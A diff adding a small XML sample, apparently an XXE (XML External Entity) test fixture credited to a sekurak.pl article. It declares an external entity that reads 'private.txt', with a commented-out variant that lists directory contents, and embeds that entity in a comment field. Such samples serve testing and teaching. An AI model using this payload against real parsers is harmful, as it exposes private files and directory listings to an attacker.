@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE strony [ 
+  <!ENTITY shp SYSTEM "private.txt"><!-- Lists file content -->
+  <!-- <!ENTITY shp SYSTEM "."> --><!-- Lists directories content -->
+] >
+<strony>
+    <strona id="sekurak">
+        <nazwa>Sekurak</nazwa>
+        <komentarz>I &lt;3 Sekurak! &shp;</komentarz>
+    </strona>
+</strony>
+
+<!-- Example taken from: http://sekurak.pl/problemy-z-xxe-xml-external-entity/ -->
